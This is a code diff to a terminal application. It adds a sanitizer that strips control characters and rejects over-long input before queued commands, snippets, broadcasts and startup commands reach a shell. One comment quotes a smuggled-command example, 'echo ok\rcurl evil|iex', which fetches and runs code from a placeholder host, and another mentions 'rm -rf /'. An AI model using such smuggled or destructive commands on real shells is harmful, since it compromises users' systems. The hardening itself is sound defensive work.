@@ -927,19 +927,24 @@ function handleBridgeMessage(message) {
     updateTerminalSearchVisibility(terminal);
     scheduleFit(terminal);
 
-    if (terminal.runStartup && state.settings.startupCommand.trim()) {
+    // The startup command runs unattended in every new shell, which makes it the
+    // most valuable thing in settings for an attacker to tamper with; filter it
+    // so it can never become more than the single line the user configured.
+    const startup = terminal.runStartup ? safeTerminalCommand(state.settings.startupCommand) : null;
+    if (startup) {
       terminal.runStartup = false;
-      const command = state.settings.startupCommand.trim();
-      window.setTimeout(() => sendBridge({ type: "input", id: terminal.id, data: `${command}\r` }), 250);
+      window.setTimeout(() => sendBridge({ type: "input", id: terminal.id, data: `${startup}\r` }), 250);
     }
 
     // A command queued at creation time (e.g. a broadcast with no terminals
     // open) runs once the shell is live, after any startup command.
     if (terminal.pendingCommand) {
-      const pending = terminal.pendingCommand;
+      const pending = safeTerminalCommand(terminal.pendingCommand);
       const withEnter = terminal.pendingCommandEnter;
       terminal.pendingCommand = null;
-      window.setTimeout(() => sendBridge({ type: "input", id: terminal.id, data: `${pending}${withEnter ? "\r" : ""}` }), 500);
+      if (pending) {
+        window.setTimeout(() => sendBridge({ type: "input", id: terminal.id, data: `${pending}${withEnter ? "\r" : ""}` }), 500);
+      }
     }
     return;
   }
@@ -2888,6 +2893,43 @@ function stripTerminalControlCodes(value) {
     .replace(/\x1b\][^\x07]*(?:\x07|\x1b\\)/g, "")
     .replace(/\x1b\[[0-?]*[ -/]*[@-~]/g, "")
     .replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, "");
+}
+
+// Text on its way *into* a shell is held to a far stricter standard than text on
+// its way out. Anything the app composes on the user's behalf — a queued command,
+// a snippet, a broadcast, a slash-command argument — is presented as one literal
+// line they get to read before it runs, so every character that could break that
+// promise is removed rather than forwarded:
+//
+//   CR/LF  submit the line, turning "insert" into "execute" and letting a single
+//          entry smuggle a second, hidden command ("echo ok\rcurl evil|iex");
+//   ESC    and the rest of C0/C1 drive the terminal's own escape handling, which
+//          can rewrite what the prompt appears to say;
+//   TAB    triggers the shell's completion instead of inserting whitespace;
+//   DEL    erases a character the user believes is there.
+//
+// Runs collapse to a single space, absorbing any whitespace on either side, so
+// pasted multi-line text ("echo one\n  echo two") joins into one tidy line rather
+// than a ragged one. This is deliberately the mirror image of
+// stripTerminalControlCodes above, which keeps CR/LF/TAB because it is scrubbing
+// shell *output* for display and search.
+function sanitizeTerminalCommand(value) {
+  return String(value ?? "")
+    .replace(/\s*[\u0000-\u001f\u007f-\u009f\u2028\u2029]+\s*/g, " ")
+    .trim();
+}
+
+// A single command line has a plausible ceiling; anything past it is a tampered
+// or corrupted payload. Over-length input is *rejected* rather than truncated,
+// because truncation is its own hazard — clipping "rm -rf /tmp/scratch" yields a
+// still-runnable "rm -rf /".
+const MAX_TERMINAL_COMMAND_LENGTH = 8192;
+
+// Returns the command safe to hand to a PTY, or null when nothing usable is left.
+function safeTerminalCommand(value) {
+  const command = sanitizeTerminalCommand(value);
+  if (!command || command.length > MAX_TERMINAL_COMMAND_LENGTH) return null;
+  return command;
 }
 
 function sendBridge(message) {
@@ -4932,7 +4974,10 @@ function broadcastTargetIds() {
 }
 
 function sendBroadcast() {
-  const command = elements.broadcastInput.value;
+  // One keystroke here types into every matching terminal at once, so the text is
+  // filtered before it is fanned out: with "send Enter" off the user is promised
+  // the command is only staged, and an embedded CR would run it everywhere.
+  const command = safeTerminalCommand(elements.broadcastInput.value);
   if (!command) return;
 
   // No terminals at all: open one and run the command there once it is live.
@@ -5100,11 +5145,18 @@ function runSnippet(id, snippet) {
     return;
   }
   if (!snippet || !snippet.command) return;
-  sendBridge({ type: "input", id: targetId, data: `${snippet.command}\r` });
+  // Snippets live in localStorage and are run with a trailing Enter, so a stored
+  // newline would chain a second command the menu never showed.
+  const command = safeTerminalCommand(snippet.command);
+  if (!command) {
+    toast("That snippet is malformed and was not run.", "error", 2400);
+    return;
+  }
+  sendBridge({ type: "input", id: targetId, data: `${command}\r` });
 }
 
 function addSnippet(name, command) {
-  const trimmedCommand = String(command || "").trim();
+  const trimmedCommand = safeTerminalCommand(command);
   if (!trimmedCommand) {
     toast("Enter a command", "info", 1600);
     return;
@@ -6109,9 +6161,13 @@ function normalizeArtifactPid(value) {
   return Number.isInteger(pid) && pid > 0 ? pid : null;
 }
 
+// Queue entries are replayed straight into a shell, so what comes back out of
+// localStorage is treated as untrusted input rather than as our own data: it may
+// have been written by a tampered profile, a synced settings file, or an older
+// build with weaker filtering.
 function normalizeQueueItem(item, index, prefix) {
   if (!item || typeof item !== "object") return null;
-  const command = typeof item.command === "string" ? item.command.trim() : "";
+  const command = typeof item.command === "string" ? safeTerminalCommand(item.command) : null;
   if (!command) return null;
   return {
     ...item,
@@ -6533,9 +6589,15 @@ function renderTerminalArtifacts() {
 
 function addCommandQueueItem() {
   const raw = elements.commandQueueInput.value;
-  const command = String(raw || "").replace(/\s*[\r\n]+\s*/g, " ").trim();
+  const command = safeTerminalCommand(raw);
   if (!command) {
-    toast("Enter a command or prompt to queue.", "info", 1800);
+    toast(
+      sanitizeTerminalCommand(raw)
+        ? `Commands are limited to ${MAX_TERMINAL_COMMAND_LENGTH} characters.`
+        : "Enter a command or prompt to queue.",
+      "info",
+      1800
+    );
     elements.commandQueueInput.focus();
     return;
   }
@@ -6614,7 +6676,20 @@ function dequeueQueueItem({
     toast("That terminal is not ready yet; the command remains queued.", "info", 2200);
     return false;
   }
-  if (!sendBridge({ type: "input", id: terminal.id, data: items[index].command })) {
+
+  // Last line of defense before the PTY. The stored command was already filtered
+  // on the way in, so a mismatch here means the persisted copy was altered behind
+  // the app's back; drop the entry rather than typing an unreviewed payload into
+  // a live shell.
+  const command = safeTerminalCommand(items[index].command);
+  if (!command) {
+    items.splice(index, 1);
+    saveTerminalArtifacts();
+    if (closeArtifacts) renderTerminalArtifacts();
+    toast("That queued command was malformed and has been discarded.", "error", 2600);
+    return false;
+  }
+  if (!sendBridge({ type: "input", id: terminal.id, data: command })) {
     toast("Bridge unavailable; the command remains queued.", "error", 2400);
     return false;
   }
@@ -7747,21 +7822,37 @@ function logFileName(logPath) {
 // so it is reversed for display). Picking one inserts it into the terminal
 // without pressing Enter and removes it from the queue; clicking the row itself
 // opens the full notes & queue manager so commands can still be staged there.
+//
+// The list is capped: a queue is persisted state that can grow without bound (or
+// be inflated by a tampered profile), and a menu is the wrong place to render
+// thousands of rows. Past the cap the row points at the manager, which pages and
+// scrolls properly.
+const MAX_QUEUE_SUBMENU_ITEMS = 12;
+
 function buildCommandQueueMenuItem(terminal) {
   const queue = state.terminalArtifacts.terminals[terminal.id]?.queue || [];
-  const submenu = queue.length
-    ? [...queue].reverse().map((entry) => ({
-        label: entry.command,
-        icon: "terminal",
-        title: entry.command,
-        run: () => dequeueTerminalCommand(terminal, entry.id)
-      }))
-    : [{ info: true, icon: "inbox", label: "No queued commands" }];
+  const newestFirst = [...queue].reverse();
+  const shown = newestFirst.slice(0, MAX_QUEUE_SUBMENU_ITEMS);
+  const submenu = shown.map((entry) => ({
+    // Labels are re-filtered on the way to the screen so a stored payload cannot
+    // smuggle control characters into the menu even if it bypassed the loader.
+    label: sanitizeTerminalCommand(entry.command),
+    icon: "terminal",
+    title: sanitizeTerminalCommand(entry.command),
+    run: () => dequeueTerminalCommand(terminal, entry.id)
+  }));
+  if (newestFirst.length > shown.length) {
+    submenu.push({
+      info: true,
+      icon: "ellipsis",
+      label: `${newestFirst.length - shown.length} more in the queue manager\u2026`
+    });
+  }
   return {
     label: "Command queue",
     icon: "list-ordered",
     title: "Insert a queued command, or open the queue manager",
-    submenu,
+    submenu: submenu.length ? submenu : [{ info: true, icon: "inbox", label: "No queued commands" }],
     run: () => openTerminalArtifacts(terminal.id)
   };
 }
@@ -7837,8 +7928,11 @@ function buildContextMenu(terminal, selection = terminal.term.getSelection()) {
   renderContextMenu(items);
 }
 
+// The value arrives from a free-text field in the context menu, so it is filtered
+// exactly like a queued command: without this a pasted CR would close the slash
+// command early and run whatever followed it as a shell command.
 function sendTerminalSlashCommand(terminal, command, rawValue) {
-  const value = String(rawValue || "").trim();
+  const value = safeTerminalCommand(rawValue);
   if (!terminal || !value) return;
   sendBridge({ type: "input", id: terminal.id, data: `/${command} ${value}\r` });
 }
